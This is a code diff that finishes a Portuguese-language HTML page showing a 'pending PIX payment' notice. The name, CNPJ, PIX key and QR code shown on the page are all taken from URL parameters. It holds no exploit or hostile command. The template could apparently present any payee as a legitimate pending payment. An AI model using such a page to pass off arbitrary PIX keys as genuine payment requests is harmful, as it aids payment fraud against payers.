@@ -141,4 +141,78 @@
         <div class="status-alert">
             <img src="erro.png" alt="Erro">
             <div class="status-text">
-                <strong style="font-size
+                <strong style="font-size: 16px; color: red;">PIX Pendente!</strong><br>
+                Aguardando Pagamento...
+            </div>
+        </div>
+        <div class="receiver-info">
+            <h2>Dados do Comprador:</h2>
+            <label>Nome</label>
+            <p id="nome"></p>
+            <label>CNPJ</label> <!-- Substituído "cpf" por "cnpj" -->
+            <p id="cnpj"></p>
+            <label>Chave PIX</label>
+            <p id="pix">
+                <span onclick="navigator.clipboard.writeText(document.getElementById('pix').textContent); alert('PIX COPIA E COLA COPIADO!');" style="cursor: pointer;">Copiar Chave PIX</span>
+                <br>
+                <img id="qrcode" src="" alt="QR Code">
+            </p>
+        </div>
+    </div>
+    <script>
+        // Função para obter os parâmetros da URL
+        function getQueryParams() {
+            var params = {};
+            var parser = document.createElement('a');
+            parser.href = window.location.href;
+            var query = parser.search.substring(1);
+            var vars = query.split('&');
+            for (var i = 0; i < vars.length; i++) {
+                var pair = vars[i].split('=');
+                params[pair[0]] = decodeURIComponent(pair[1]);
+            }
+            return params;
+        }
+
+        // Função para atualizar a data e a hora
+        function updateDateTime() {
+            var now = new Date();
+            var options = {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: false,
+                timeZone: 'America/Sao_Paulo'
+            };
+            var dateTimeString = now.toLocaleString('pt-BR', options).replace(',', ''); // Remove a vírgula
+            var [date, time] = dateTimeString.split(' ');
+            document.querySelector('.value-date span:first-child').textContent = date.trim(); // Remove espaços em branco extras
+            document.querySelector('.value-date span:last-child').textContent = time;
+        }
+
+        // Configura os parâmetros da URL nos campos
+        window.onload = function () {
+            var queryParams = getQueryParams();
+            if (queryParams.nome) {
+                document.getElementById('nome').textContent = queryParams.nome;
+            }
+            if (queryParams.cnpj) { // Substituído "cpf" por "cnpj"
+                document.getElementById('cnpj').textContent = queryParams.cnpj;
+            }
+            if (queryParams.pix) {
+                document.getElementById('pix').textContent = queryParams.pix;
+                // Atualizar o QR Code com o valor da chave PIX
+                document.getElementById('qrcode').src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${queryParams.pix}`;
+            }
+            if (queryParams.qrcode) {
+                document.getElementById('qrcode').src = queryParams.qrcode;
+            }
+            // Atualiza a data e a hora ao carregar a página
+            updateDateTime();
+        };
+    </script>
+</body>
+</html>
